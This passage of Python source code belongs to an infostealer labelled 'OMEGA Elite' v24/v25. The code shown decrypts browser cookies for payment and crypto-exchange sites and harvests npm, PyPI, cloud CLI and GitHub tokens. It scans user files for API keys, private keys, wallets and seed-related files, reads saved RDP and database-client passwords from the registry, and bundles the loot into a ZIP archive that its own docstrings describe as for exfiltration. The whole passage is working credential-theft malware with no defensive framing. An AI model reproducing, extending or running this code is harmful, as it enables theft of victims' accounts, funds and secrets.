        re.compile(r'(live_[A-Za-z0-9\-_]{20,})'),             # Twitch stream key
    ]

    for browser_name, browser_path in {**CHROMIUM_BROWSERS}.items():
        if not os.path.exists(browser_path):
            continue
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 5)]:
            ext_root = os.path.join(browser_path, profile, "Local Extension Settings")
            if not os.path.exists(ext_root):
                continue
            for ext_id in os.listdir(ext_root):
                ldb_path = os.path.join(ext_root, ext_id)
                for f in glob.glob(os.path.join(ldb_path, "*.ldb")) + \
                         glob.glob(os.path.join(ldb_path, "*.log")):
                    try:
                        text = open(f, "rb").read().decode("utf-8", errors="ignore")
                        hits = []
                        for pat in TOKEN_PATTERNS:
                            for m in pat.finditer(text):
                                hits.append(m.group(0)[:120])
                        if hits:
                            results.append({
                                "type":    f"ExtensionToken/{browser_name}",
                                "ext_id":  ext_id,
                                "profile": profile,
                                "tokens":  list(set(hits))[:20],
                            })
                    except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# GAMING CHEATS / PAID SOFTWARE (private cheat loaders, injectors)
# ─────────────────────────────────────────────────────────────────────────────
def _get_cheat_software_tokens() -> list:
    """Extract auth tokens from paid cheat loaders and game-mod software."""
    import re
    results = []
    CHEAT_DIRS = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        os.path.join(HOME, "AppData", "Local"),
        os.path.join(HOME, "AppData", "Roaming"),
        r"C:\cheats",
        r"C:\hacks",
        r"C:\loaders",
    ]
    TOKEN_RE = re.compile(r'(?:token|hwid|license|key|serial|auth)["\s:=]+([A-Za-z0-9\-_\.]{16,})', re.I)
    HWID_RE  = re.compile(r'HWID["\s:=]+([A-Za-z0-9\-]{8,})', re.I)
    EXTS = {".json", ".cfg", ".ini", ".txt", ".dat", ".xml", ".conf"}

    for d in CHEAT_DIRS:
        if not os.path.exists(d):
            continue
        for root, dirs, files in os.walk(d):
            dirs[:] = dirs[:10]  # limit depth breadth
            for fname in files:
                if os.path.splitext(fname)[1].lower() not in EXTS:
                    continue
                fpath = os.path.join(root, fname)
                try:
                    sz = os.path.getsize(fpath)
                    if sz == 0 or sz > 500000:
                        continue
                    text = open(fpath, "r", encoding="utf-8", errors="ignore").read()
                    tokens = TOKEN_RE.findall(text)
                    hids   = HWID_RE.findall(text)
                    if tokens or hids:
                        results.append({
                            "type":   "Cheat Loader Token",
                            "file":   fpath,
                            "tokens": tokens[:10],
                            "hwids":  hids[:5],
                            "data":   text[:400],
                        })
                except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# FINANCIAL / PAYMENT COOKIES — PayPal, Coinbase, Binance, Kraken, Bybit, etc.
# ─────────────────────────────────────────────────────────────────────────────
def _get_financial_cookies() -> list:
    results = []
    TARGETS = {
        "paypal.com":    ["PYPLUID", "KHcookie", "ts", "ts_c", "nsid"],
        "coinbase.com":  ["user_id", "jwt", "device_id", "remember_device"],
        "binance.com":   ["p20t", "BNC-LT", "csrftoken", "logined"],
        "kraken.com":    ["session", "kraken_key"],
        "bybit.com":     ["deviceId", "TOKEN"],
        "kucoin.com":    ["ku_user", "PHPSESSID"],
        "robinhood.com": ["guest_id", "crypto_id_token"],
        "strike.me":     ["access_token", "session"],
        "cashapp.com":   ["s", "session_token"],
        "venmo.com":     ["v_id", "api_access_token"],
        "wise.com":      ["PHPSESSID", "sid"],
    }

    for browser_name, browser_path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        master_key = _get_master_key(browser_path)
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 6)]:
            for cookie_loc in ["Network/Cookies", "Cookies"]:
                cookie_db = os.path.join(browser_path, profile, cookie_loc)
                if not os.path.exists(cookie_db):
                    continue
                temp = os.path.join(os.environ.get("TEMP",""), f"__fin_{browser_name}_{profile}.db")
                try:
                    shutil.copy2(cookie_db, temp)
                    conn = sqlite3.connect(temp)
                    for host, priority in TARGETS.items():
                        q = f"SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%{host}%' LIMIT 100"
                        for row in conn.execute(q).fetchall():
                            name, ev = row
                            val = _decrypt_value(ev, master_key) if master_key else ""
                            if val:
                                results.append({
                                    "type":     f"FinancialCookie/{host}",
                                    "browser":  browser_name,
                                    "cookie":   name,
                                    "value":    val[:300],
                                    "priority": name in priority,
                                })
                    conn.close()
                except: pass
                finally:
                    try: os.remove(temp)
                    except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# PACKAGE MANAGER TOKENS — npm, pip, cargo, composer, maven
# ─────────────────────────────────────────────────────────────────────────────
def _get_package_manager_tokens() -> list:
    results = []

    # ── npm ──
    npmrc = os.path.join(HOME, ".npmrc")
    if os.path.exists(npmrc):
        results.append({"type": "npm .npmrc", "data": open(npmrc, encoding="utf-8", errors="ignore").read()})

    npm_tokens_dir = os.path.join(APPDATA, "npm-cache", "_auth")
    if os.path.exists(npm_tokens_dir):
        for f in glob.glob(os.path.join(npm_tokens_dir, "*"))[:5]:
            results.append({"type": "npm Auth Cache", "file": f,
                             "data": open(f, encoding="utf-8", errors="ignore").read()[:300]})

    # ── pip credentials ──
    pip_conf = os.path.join(APPDATA, "pip", "pip.ini")
    if not os.path.exists(pip_conf):
        pip_conf = os.path.join(HOME, ".config", "pip", "pip.conf")
    if os.path.exists(pip_conf):
        results.append({"type": "pip Config", "data": open(pip_conf, encoding="utf-8", errors="ignore").read()})

    # ── PyPI token (in .pypirc) ──
    pypirc = os.path.join(HOME, ".pypirc")
    if os.path.exists(pypirc):
        results.append({"type": "PyPI .pypirc", "data": open(pypirc, encoding="utf-8", errors="ignore").read()})

    # ── Composer (PHP) ──
    composer_auth = os.path.join(APPDATA, "Composer", "auth.json")
    if os.path.exists(composer_auth):
        results.append({"type": "Composer auth.json", "data": open(composer_auth, encoding="utf-8", errors="ignore").read()})

    # ── Maven settings (Java) ──
    maven_settings = os.path.join(HOME, ".m2", "settings.xml")
    if os.path.exists(maven_settings):
        results.append({"type": "Maven settings.xml", "data": open(maven_settings, encoding="utf-8", errors="ignore").read()[:2000]})

    # ── Cargo (Rust) ──
    cargo_cred = os.path.join(HOME, ".cargo", "credentials.toml")
    if not os.path.exists(cargo_cred):
        cargo_cred = os.path.join(HOME, ".cargo", "credentials")
    if os.path.exists(cargo_cred):
        results.append({"type": "Cargo credentials", "data": open(cargo_cred, encoding="utf-8", errors="ignore").read()})

    # ── Gradle ──
    gradle_props = os.path.join(HOME, ".gradle", "gradle.properties")
    if os.path.exists(gradle_props):
        content = open(gradle_props, encoding="utf-8", errors="ignore").read()
        if any(k in content.lower() for k in ["password", "token", "key", "secret"]):
            results.append({"type": "Gradle properties", "data": content[:1000]})

    # ── Nuget (C#) ──
    nuget_cfg = os.path.join(APPDATA, "NuGet", "NuGet.Config")
    if os.path.exists(nuget_cfg):
        results.append({"type": "NuGet Config", "data": open(nuget_cfg, encoding="utf-8", errors="ignore").read()})

    return results


# ─────────────────────────────────────────────────────────────────────────────
# BROWSER DOWNLOAD HISTORY — recent files + download paths
# ─────────────────────────────────────────────────────────────────────────────
def _get_download_history() -> list:
    results = []
    for browser_name, browser_path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 5)]:
            dl_db = os.path.join(browser_path, profile, "History")
            if not os.path.exists(dl_db):
                continue
            temp = os.path.join(os.environ.get("TEMP",""), f"__dl_{browser_name}_{profile}.db")
            try:
                shutil.copy2(dl_db, temp)
                conn = sqlite3.connect(temp)
                rows = conn.execute(
                    "SELECT target_path, referrer, tab_url, mime_type, total_bytes FROM downloads "
                    "ORDER BY start_time DESC LIMIT 100"
                ).fetchall()
                for row in rows:
                    path, ref, url, mime, size = row
                    if path:
                        results.append({
                            "type":    f"Download/{browser_name}",
                            "path":    path,
                            "url":     url or ref or "",
                            "mime":    mime or "",
                            "size_b":  size or 0,
                        })
                conn.close()
            except: pass
            finally:
                try: os.remove(temp)
                except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# SENSITIVE FILE HARVESTER — grabs password files, private keys, tax docs
# ─────────────────────────────────────────────────────────────────────────────
def _harvest_sensitive_files() -> list:
    """Locate and exfil high-value files by name pattern."""
    results = []
    PATTERNS = [
        # Private keys / certificates
        "*.pem", "*.p12", "*.pfx", "*.cer", "*.crt", "*.key", "*.ppk",
        # Wallets
        "*.wallet", "wallet.dat", "*.kdbx",
        # Password / secret files
        "password*.*", "*password*.txt", "*pass*.txt", "*creds*.*",
        "secrets*.*", "*secret*.*", "*.env",
        # Recovery / backup
        "*recovery*.*", "*mnemonic*.*", "*seed*.*", "*backup*.*",
        # Tax / finance  
        "*.pdf",  # limit to suspicious paths only
        # Database dumps
        "*.sql", "*.dump",
        # Config files with auth
        "config.json", "credentials.json", "token.json",
    ]
    SCAN_ROOTS = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        HOME,
    ]
    MAX_FILE_SIZE = 2 * 1024 * 1024  # 2 MB
    MAX_EXFIL     = 50  # guard

    seen = set()
    count = 0
    for root_dir in SCAN_ROOTS:
        if not os.path.exists(root_dir) or count >= MAX_EXFIL:
            break
        for root, dirs, files in os.walk(root_dir):
            dirs[:] = [d for d in dirs if d.lower() not in
                       {"windows","program files","program files (x86)","appdata",
                        "node_modules","__pycache__",".git"}]
            for fname in files:
                fpath = os.path.join(root, fname)
                if fpath in seen or count >= MAX_EXFIL:
                    continue
                seen.add(fpath)
                matched_pat = None
                for pat in PATTERNS:
                    import fnmatch
                    if fnmatch.fnmatch(fname.lower(), pat.lower()):
                        matched_pat = pat
                        break
                if not matched_pat:
                    continue
                try:
                    sz = os.path.getsize(fpath)
                    if sz == 0 or sz > MAX_FILE_SIZE:
                        continue
                    # For PDFs / binary, just note the path
                    if fname.lower().endswith((".pdf", ".sql", ".dump", ".pfx",
                                               ".p12", ".kdbx", ".ppk")):
                        results.append({
                            "type":    "Sensitive File Found",
                            "path":    fpath,
                            "size_kb": sz // 1024,
                            "pattern": matched_pat,
                        })
                    else:
                        content = open(fpath, "r", encoding="utf-8", errors="ignore").read()
                        results.append({
                            "type":    "Sensitive File",
                            "path":    fpath,
                            "size_kb": sz // 1024,
                            "pattern": matched_pat,
                            "data":    content[:2000],
                        })
                    count += 1
                except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# RDP SAVED CREDENTIALS & MRU
# ─────────────────────────────────────────────────────────────────────────────
def _get_rdp_data() -> list:
    results = []
    try:
        # Recent RDP connections
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Terminal Server Client\Default")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                results.append({"type": "RDP MRU", "key": n, "server": str(v)})
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass

    try:
        # Per-host saved creds
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Terminal Server Client\Servers")
        for j in range(512):
            try:
                server = winreg.EnumKey(key, j)
                sk = winreg.OpenKey(key, server)
                entry = {"type": "RDP Saved Host", "server": server}
                for v in ["UsernameHint"]:
                    try: entry[v] = winreg.QueryValueEx(sk, v)[0]
                    except: pass
                results.append(entry)
                winreg.CloseKey(sk)
            except OSError: break
        winreg.CloseKey(key)
    except: pass

    # .rdp files
    for root_dir in [HOME, os.path.join(HOME, "Desktop"), os.path.join(HOME, "Documents")]:
        for f in glob.glob(os.path.join(root_dir, "**", "*.rdp"), recursive=True)[:10]:
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                results.append({"type": "RDP File", "path": f, "data": content[:500]})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# SOCIAL MEDIA TOKENS — X/Twitter, Instagram, GitHub, Reddit
# ─────────────────────────────────────────────────────────────────────────────
def _get_social_tokens() -> list:
    import re
    results = []
    PATTERNS = {
        "GitHub PAT":       re.compile(r"(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82})"),
        "GitHub App Token": re.compile(r"(ghs_[A-Za-z0-9]{36})"),
        "Twitter Bearer":   re.compile(r"(AAAA[A-Za-z0-9%]{30,})"),
        "OpenAI":           re.compile(r"(sk-[A-Za-z0-9]{48})"),
        "Anthropic":        re.compile(r"(sk-ant-api[A-Za-z0-9\-]{40,})"),
        "HuggingFace":      re.compile(r"(hf_[A-Za-z0-9]{30,})"),
        "Google API":       re.compile(r"(AIza[0-9A-Za-z\-_]{35})"),
        "AWS Secret":       re.compile(r"(AKIA[0-9A-Z]{16})"),
        "Stripe Secret":    re.compile(r"(sk_live_[0-9a-zA-Z]{24,})"),
        "Stripe Publish":   re.compile(r"(pk_live_[0-9a-zA-Z]{24,})"),
        "Telegram Bot":     re.compile(r"([0-9]{9}:[A-Za-z0-9_\-]{35})"),
    }

    SCAN_DIRS = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        HOME,
    ]
    SCAN_EXTS = {".txt", ".py", ".js", ".ts", ".env", ".json", ".cfg",
                 ".ini", ".yml", ".yaml", ".sh", ".bat", ".ps1", ".rb",
                 ".go", ".java", ".cs", ".php", ".conf"}
    seen = set()

    for d in SCAN_DIRS:
        if not os.path.exists(d):
            continue
        for root, dirs, files in os.walk(d):
            dirs[:] = [x for x in dirs if x.lower() not in
                       {"node_modules","__pycache__",".git","vendor","dist","build"}]
            for fname in files:
                if os.path.splitext(fname)[1].lower() not in SCAN_EXTS:
                    continue
                fpath = os.path.join(root, fname)
                if fpath in seen:
                    continue
                seen.add(fpath)
                try:
                    sz = os.path.getsize(fpath)
                    if sz == 0 or sz > 1024 * 1024:
                        continue
                    text = open(fpath, "r", encoding="utf-8", errors="ignore").read()
                    for token_type, pat in PATTERNS.items():
                        for m in pat.finditer(text):
                            results.append({
                                "type":  f"API Token/{token_type}",
                                "file":  fpath,
                                "token": m.group(0)[:150],
                            })
                except: pass

    # Also check browser localStorage for GitHub / Twitter sessions
    for browser_name, browser_path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        for profile in ["Default"]:
            ls_dir = os.path.join(browser_path, profile, "Local Storage", "leveldb")
            if not os.path.exists(ls_dir):
                continue
            for f in glob.glob(os.path.join(ls_dir, "*.ldb"))[:5]:
                try:
                    text = open(f, "rb").read().decode("utf-8", errors="ignore")
                    for token_type, pat in PATTERNS.items():
                        for m in pat.finditer(text):
                            results.append({
                                "type": f"BrowserLocalStorage/{token_type}/{browser_name}",
                                "token": m.group(0)[:150],
                            })
                except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# INSTALLED GAME ANTI-CHEAT BYPASS TOKENS & HWID SPOOFER CONFIGS
# ─────────────────────────────────────────────────────────────────────────────
def _get_anticheat_data() -> list:
    """Grab spoofer configs, HWID bypass tokens, and AC-specific auth files."""
    import re
    results = []
    AC_DIRS = [
        os.path.join(LOCALAPPDATA, "Easy Anti-Cheat"),
        os.path.join(LOCALAPPDATA, "BattlEye"),
        os.path.join(LOCALAPPDATA, "Vanguard"),
        r"C:\EasyAntiCheat",
        r"C:\BattlEye",
    ]
    TOKEN_RE = re.compile(r'[A-Za-z0-9\-_]{32,}')

    for d in AC_DIRS:
        for ext in ["*.json", "*.log", "*.cfg", "*.dat", "*.ini"]:
            for f in glob.glob(os.path.join(d, "**", ext), recursive=True)[:5]:
                try:
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    results.append({"type": f"AntiCheat Config", "dir": d,
                                    "file": os.path.basename(f), "data": content[:600]})
                except: pass

    # Common spoofer directories
    spoofer_dirs = [
        os.path.join(HOME, "Desktop", "Spoofer"),
        os.path.join(HOME, "Downloads"),
        os.path.join(HOME, "Documents"),
    ]
    for d in spoofer_dirs:
        for f in glob.glob(os.path.join(d, "*spoofer*", "*.json"), recursive=False) + \
                 glob.glob(os.path.join(d, "*spoof*", "*.cfg"), recursive=False)[:3]:
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                results.append({"type": "Spoofer Config", "file": f, "data": content[:400]})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# v24 HARVEST — full extraction with all new modules
# ─────────────────────────────────────────────────────────────────────────────
def run_omega_harvest_v24(log_func=None) -> bytes:
    """OMEGA Elite v24 — maximum extraction. Returns ZIP bytes."""
    import zipfile, io

    def log(m):
        if log_func: log_func(m)

    # Build on v23 base
    zip_v23 = run_omega_harvest_v23(log_func)

    # Unpack v23 zip
    v23_data = {}
    import zipfile as _zf
    with _zf.ZipFile(io.BytesIO(zip_v23), "r") as z:
        for name in z.namelist():
            v23_data[name] = z.read(name)

    # New v24 categories
    v24 = {}

    log("[v24] Seed phrase scanner (BIP-39)…")
    v24["seed_phrases"] = _scan_seed_phrases()

    log("[v24] NTLM hash dump (VSS + reg save)…")
    v24["ntlm_hashes"] = _dump_ntlm_hashes()

    log("[v24] Cloud storage OAuth (GDrive / Dropbox / OneDrive / MEGA)…")
    v24["cloud_storage"] = _get_cloud_storage_tokens()

    log("[v24] Browser extension sweep (API keys / tokens)…")
    v24["extension_tokens"] = _sweep_browser_extensions()

    log("[v24] Financial cookies (PayPal / Binance / Kraken / Coinbase)…")
    v24["financial_cookies"] = _get_financial_cookies()

    log("[v24] Package manager tokens (npm / pip / cargo / composer)…")
    v24["package_tokens"] = _get_package_manager_tokens()

    log("[v24] Download history…")
    v24["downloads"] = _get_download_history()

    log("[v24] Sensitive file harvest (.pem / .wallet / .env / .sql)…")
    v24["sensitive_files"] = _harvest_sensitive_files()

    log("[v24] RDP MRU & saved credentials…")
    v24["rdp"] = _get_rdp_data()

    log("[v24] Social / API tokens (GitHub / OpenAI / Stripe / AWS / Telegram)…")
    v24["api_tokens"] = _get_social_tokens()

    log("[v24] Anti-cheat / spoofer configs…")
    v24["anticheat"] = _get_anticheat_data()

    log("[v24] Cheat loader tokens (HWID / license keys)…")
    v24["cheat_tokens"] = _get_cheat_software_tokens()

    # Pack combined zip
    buf = io.BytesIO()
    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED, compresslevel=9) as zf:
        # Re-include all v23 data
        for name, data in v23_data.items():
            if name != "SUMMARY.json":
                zf.writestr(name, data)
        # Add new v24 categories
        for category, items in v24.items():
            if items:
                zf.writestr(f"v24/{category}.json",
                            json.dumps(items, indent=2, ensure_ascii=False))
        # Combined summary
        v23_summary = json.loads(v23_data.get("SUMMARY.json", b"{}"))
        v23_summary.update({
            "version":          "OMEGA Elite v24",
            "seed_phrases":     len(v24["seed_phrases"]),
            "ntlm_haves":       len(v24["ntlm_hashes"]),
            "cloud_tokens":     len(v24["cloud_storage"]),
            "ext_tokens":       len(v24["extension_tokens"]),
            "financial_cookies": len(v24["financial_cookies"]),
            "package_tokens":   len(v24["package_tokens"]),
            "downloads":        len(v24["downloads"]),
            "sensitive_files":  len(v24["sensitive_files"]),
            "rdp_entries":      len(v24["rdp"]),
            "api_tokens":       len(v24["api_tokens"]),
            "anticheat":        len(v24["anticheat"]),
            "cheat_tokens":     len(v24["cheat_tokens"]),
        })
        zf.writestr("SUMMARY.json", json.dumps(v23_summary, indent=2))

    total_v24 = sum(len(v) for v in v24.values())
    log(f"[v24] ✓ Complete — {total_v24} new v24 records + full v23 archive")
    return buf.getvalue()


# (Removed intermediate v23/v24 alias to break infinite recursion)


# ═════════════════════════════════════════════════════════════════════════════
# ██████████████████████  v25 ULTRA MODULE  ███████████████████████████████████
# ═════════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────────────────
# DATABASE GUI CLIENTS — DBeaver / TablePlus / HeidiSQL / MongoDB Compass /
#                       Redis Desktop Manager / Sequel Ace / DataGrip
# ─────────────────────────────────────────────────────────────────────────────
def _get_database_clients() -> list:
    results = []

    # ── DBeaver ─── (biggest DB GUI, stores encrypted passwords)
    dbeaver_paths = [
        os.path.join(APPDATA, "DBeaverData", "workspace6", ".metadata", ".plugins",
                     "org.jkiss.dbeaver.core", "Global", "credentials-config.json"),
        os.path.join(HOME, ".local", "share", "DBeaverData", "workspace6",
                     ".metadata", ".plugins", "org.jkiss.dbeaver.core",
                     "Global", "credentials-config.json"),
    ]
    for dp in dbeaver_paths:
        if os.path.exists(dp):
            results.append({"type": "DBeaver Credentials",
                             "data": open(dp, encoding="utf-8", errors="ignore").read()[:3000]})

    dbeaver_conn = os.path.join(APPDATA, "DBeaverData", "workspace6",
                                ".metadata", ".plugins", "org.jkiss.dbeaver.core",
                                "Global", "data-sources.json")
    if os.path.exists(dbeaver_conn):
        results.append({"type": "DBeaver Connections",
                         "data": open(dbeaver_conn, encoding="utf-8", errors="ignore").read()[:4000]})

    # Also scan DBeaverData folder
    dbeaver_root = os.path.join(APPDATA, "DBeaverData")
    if os.path.exists(dbeaver_root):
        for f in glob.glob(os.path.join(dbeaver_root, "**", "credentials*"), recursive=True)[:5]:
            try:
                results.append({"type": "DBeaver Extra Creds", "file": f,
                                 "data": open(f, encoding="utf-8", errors="ignore").read()[:1000]})
            except: pass

    # ── TablePlus ──
    tableplus = os.path.join(APPDATA, "TablePlus")
    for f in glob.glob(os.path.join(tableplus, "**", "*.tplus"), recursive=True) + \
             glob.glob(os.path.join(tableplus, "**", "*.json"), recursive=True):
        try:
            content = open(f, "r", encoding="utf-8", errors="ignore").read()
            if any(k in content.lower() for k in ["password", "host", "user", "port"]):
                results.append({"type": "TablePlus Connection", "file": os.path.basename(f),
                                 "data": content[:1000]})
        except: pass

    # ── HeidiSQL ── (stores in registry)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\HeidiSQL\Servers")
        i = 0
        while True:
            try:
                session_name = winreg.EnumKey(key, i)
                sk = winreg.OpenKey(key, session_name)
                entry = {"type": "HeidiSQL Session", "name": session_name}
                for v in ["Host", "User", "Password", "Port", "Database",
                           "NetType", "WindowsAuth"]:
                    try: entry[v] = winreg.QueryValueEx(sk, v)[0]
                    except: pass
                results.append(entry)
                winreg.CloseKey(sk)
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass

    # ── MongoDB Compass ──
    compass = os.path.join(APPDATA, "MongoDB Compass")
    for f in glob.glob(os.path.join(compass, "**", "*.json"), recursive=True) + \
             glob.glob(os.path.join(compass, "**", "*.bson"), recursive=True):
        try:
            content = open(f, "r", encoding="utf-8", errors="ignore").read()
            if any(k in content.lower() for k in ["password", "host", "mongo", "uri", "auth"]):
                results.append({"type": "MongoDB Compass", "file": os.path.basename(f),
                                 "data": content[:1000]})
        except: pass

    # ── Redis Desktop Manager ──
    rdm = os.path.join(APPDATA, "resp.app")
    if not os.path.exists(rdm):
        rdm = os.path.join(APPDATA, "Redis Desktop Manager")
    for f in glob.glob(os.path.join(rdm, "**", "*.json"), recursive=True) + \
             glob.glob(os.path.join(rdm, "**", "*.rdc"), recursive=True):
        try:
            content = open(f, "r", encoding="utf-8", errors="ignore").read()
            if any(k in content.lower() for k in ["password", "auth", "host", "port"]):
                results.append({"type": "Redis Desktop", "file": os.path.basename(f),
                                 "data": content[:800]})
        except: pass

    # ── DataGrip (JetBrains) ──
    datagrip_root = os.path.join(APPDATA, "JetBrains")
    for f in glob.glob(os.path.join(datagrip_root, "DataGrip*", "**",
                                    "data_sources.xml"), recursive=True)[:3]:
        try:
            results.append({"type": "DataGrip Sources", "file": f,
                             "data": open(f, encoding="utf-8", errors="ignore").read()[:2000]})
        except: pass

    # ── Sequel Ace / Sequel Pro (Mac format — in case of cross-platform backup) ──
    sequel = os.path.join(APPDATA, "Sequel Pro")
    for f in glob.glob(os.path.join(sequel, "**", "*.spf"), recursive=True)[:5]:
        try:
            results.append({"type": "Sequel Pro Connection", "file": f,
                             "data": open(f, encoding="utf-8", errors="ignore").read()[:500]})
        except: pass

    # ── Navicat ──
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\PremiumSoft")
        i = 0
        while True:
            try:
                sub = winreg.EnumKey(key, i)
                sk = winreg.OpenKey(key, sub)
                j = 0
                while True:
                    try:
                        conn_name = winreg.EnumKey(sk, j)
                        ck = winreg.OpenKey(sk, conn_name)
                        entry = {"type": "Navicat Connection", "name": conn_name, "product": sub}
                        for v in ["Host", "UserName", "Password", "Port", "Database"]:
                            try: entry[v] = winreg.QueryValueEx(ck, v)[0]
                            except: pass
                        results.append(entry)
                        winreg.CloseKey(ck)
                        j += 1
                    except OSError: break
                winreg.CloseKey(sk)
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass

    # ── Robo 3T ──
    robo = os.path.join(APPDATA, "Robo 3T")
    for f in glob.glob(os.path.join(robo, "**", "*.json"), recursive=True)[:3]:
        try:
            content = open(f, "r", encoding="utf-8", errors="ignore").read()
            results.append({"type": "Robo3T Config", "file": os.path.basename(f), "data": content[:800]})
        except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# POSTMAN / INSOMNIA — API auth collections
# ─────────────────────────────────────────────────────────────────────────────
def _get_api_clients() -> list:
    results = []

    # ── Postman ──
    postman_paths = [
        os.path.join(APPDATA, "Postman", "IndexedDB"),
        os.path.join(APPDATA, "Postman"),
    ]
    import re
    TOKEN_RE = re.compile(r'(?:token|api.?key|secret|bearer|auth|password)["\s:=]+([A-Za-z0-9\-_\.]{15,})', re.I)

    for pp in postman_paths:
        for f in glob.glob(os.path.join(pp, "**", "*.ldb"), recursive=True)[:10] + \
                 glob.glob(os.path.join(pp, "**", "*.json"), recursive=True)[:20]:
            try:
                content = open(f, "rb").read().decode("utf-8", errors="ignore")
                hits = TOKEN_RE.findall(content)
                if hits:
                    results.append({"type": "Postman Auth", "file": os.path.basename(f),
                                    "tokens": list(set(hits))[:20], "data": content[:500]})
            except: pass

    # Postman backup exports
    postman_backup = os.path.join(HOME, "Postman")
    if os.path.exists(postman_backup):
        for f in glob.glob(os.path.join(postman_backup, "**", "*.json"), recursive=True)[:10]:
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if any(k in content.lower() for k in ["auth", "token", "bearer", "oauth"]):
                    results.append({"type": "Postman Export", "file": os.path.basename(f),
                                    "data": content[:2000]})
            except: pass

    # ── Insomnia ──
    insomnia_paths = [
        os.path.join(APPDATA, "Insomnia"),
        os.path.join(APPDATA, "insomnia"),
    ]
    for ip in insomnia_paths:
        for f in glob.glob(os.path.join(ip, "**", "*.db"), recursive=True) + \
                 glob.glob(os.path.join(ip, "**", "*.json"), recursive=True):
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if any(k in content.lower() for k in ["bearer", "oauth", "api", "token", "password"]):
                    hits = TOKEN_RE.findall(content)
                    results.append({"type": "Insomnia Auth", "file": os.path.basename(f),
                                    "tokens": list(set(hits))[:15], "data": content[:800]})
            except: pass

    # ── Hoppscotch / Bruno ──
    for app in ["Hoppscotch", "Bruno"]:
        ap = os.path.join(APPDATA, app)
        for f in glob.glob(os.path.join(ap, "**", "*.json"), recursive=True)[:5]:
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if "auth" in content.lower() or "token" in content.lower():
                    results.append({"type": f"{app} Auth", "file": os.path.basename(f),
                                    "data": content[:600]})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# CLOUD / DEVOPS CLIs — Azure / GCloud / Heroku / Firebase / GitHub CLI /
#                       Vercel / Netlify / Supabase / Railway / Fly.io
# ─────────────────────────────────────────────────────────────────────────────
def _get_cloud_cli_tokens() -> list:
    results = []

    # ── Azure CLI ──
    az_profile = os.path.join(HOME, ".azure", "accessTokens.json")
    az_tokens  = os.path.join(HOME, ".azure", "msal_token_cache.bin")
    az_service = os.path.join(HOME, ".azure", "servicePrincipalEntries.json")
    for fp in [az_profile, az_service]:
        if os.path.exists(fp):
            results.append({"type": "Azure CLI Token",
                             "data": open(fp, encoding="utf-8", errors="ignore").read()[:3000]})
    if os.path.exists(az_tokens):
        results.append({"type": "Azure MSAL Cache",
                         "data_b64": base64.b64encode(open(az_tokens,"rb").read(2048)).decode()})

    # ── Google Cloud SDK ──
    gcloud_cred = os.path.join(APPDATA, "gcloud", "credentials.db")
    gcloud_json = os.path.join(APPDATA, "gcloud", "application_default_credentials.json")
    gcloud_cfg  = os.path.join(APPDATA, "gcloud", "properties")
    for fp in [gcloud_json, gcloud_cfg]:
        if os.path.exists(fp):
            results.append({"type": "GCloud Credential",
                             "data": open(fp, encoding="utf-8", errors="ignore").read()[:2000]})
    if os.path.exists(gcloud_cred):
        try:
            conn = sqlite3.connect(gcloud_cred)
            for row in conn.execute("SELECT * FROM credentials LIMIT 5").fetchall():
                results.append({"type": "GCloud DB Row", "data": str(row)[:500]})
            conn.close()
        except: pass

    # ── Heroku CLI ──
    heroku_cred = os.path.join(HOME, ".netrc")
    if os.path.exists(heroku_cred):
        content = open(heroku_cred, "r", encoding="utf-8", errors="ignore").read()
        if "heroku" in content.lower() or "password" in content.lower():
            results.append({"type": "Heroku .netrc", "data": content[:1000]})

    # ── Firebase CLI ──
    firebase_rc = os.path.join(HOME, ".config", "configstore", "firebase-tools.json")
    if not os.path.exists(firebase_rc):
        firebase_rc = os.path.join(APPDATA, "Roaming", "firebase-tools.json")
    if os.path.exists(firebase_rc):
        results.append({"type": "Firebase CLI Token",
                         "data": open(firebase_rc, encoding="utf-8", errors="ignore").read()})

    # ── GitHub CLI ──
    gh_hosts = os.path.join(HOME, ".config", "gh", "hosts.yml")
    if os.path.exists(gh_hosts):
        results.append({"type": "GitHub CLI Token",
                         "data": open(gh_hosts, encoding="utf-8", errors="ignore").read()})

    # ── Vercel CLI ──
    vercel_token = os.path.join(HOME, ".local", "share", "com.vercel.cli", "auth.json")
